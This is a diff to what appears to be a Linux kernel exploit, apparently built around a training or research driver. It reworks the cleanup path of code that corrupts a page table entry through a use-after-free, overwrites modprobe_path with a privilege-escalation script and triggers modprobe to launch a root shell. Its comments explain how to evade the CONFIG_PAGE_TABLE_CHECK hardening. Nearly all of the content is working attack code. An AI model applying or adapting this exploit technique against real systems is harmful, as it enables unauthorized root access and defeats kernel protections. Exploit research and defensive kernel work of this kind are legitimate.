@@ -525,7 +525,7 @@ int main(void)
 
 	ret = flush_tlb(PT_INDICES_TO_VIRT(PGD_N, 0, 1, 0, 0), PT_ENTRIES * PAGE_SIZE);
 	if (ret == EXIT_FAILURE)
-		goto end;
+		goto repair;
 
 	for (i = 0; i < PT_ENTRIES; i++) {
 		unsigned long *addr = PT_INDICES_TO_VIRT(PGD_N, 0, 1, i, 0);
@@ -539,12 +539,12 @@ int main(void)
 		printf("[+] corrupted PTE entry is detected, now search modprobe_path\n");
 		modprobe_path_uaddr = memmem_modprobe_path(addr, PAGE_SIZE);
 		if (modprobe_path_uaddr == NULL)
-			goto repair;
+			break;
 
 		new_len = strlen(privesc_script_path);
 		if (new_len + 1 > KMOD_PATH_LEN) {
 			printf("[-] not enough bytes in modprobe_path\n");
-			goto repair;
+			break;
 		}
 
 		memcpy(modprobe_path_uaddr, privesc_script_path, new_len + 1); /* with null byte */
@@ -553,20 +553,19 @@ int main(void)
 		/* Launch the root shell */
 		trigger_modprobe_sock();
 		result = EXIT_SUCCESS;
-
-repair:
-		/* 
-		 * Bypass the PAGE_TABLE_CHECK hardening when the page table is freed.
-		 * To do so, we fill the page table entry with zeroes to skip memory freeing
-		 * in zap_pud_range() (see pud_none_or_clear_bad()).
-		 * This ensures that the page_table_check function is never reached for that entry
-		 */
-		act(act_fd, DRILL_ACT_SAVE_VAL, uaf_n, "0x0 0");
-
-		goto end; /* root shell is finished */
+		goto repair; /* root shell is finished */
 	}
 
 	printf("[-] failed to find / overwrite / trigger modprobe\n");
+
+repair:
+	/*
+	 * Bypass the CONFIG_PAGE_TABLE_CHECK on page table freeing.
+	 * To do so, write 0 to the corrupted page table entry
+	 * to make pte_none() called in do_zap_pte_range().
+	 * That allows to skip the checks.
+	 */
+	act(act_fd, DRILL_ACT_SAVE_VAL, uaf_n, "0x0 0");
 
 end:
 	if (act_fd >= 0) {
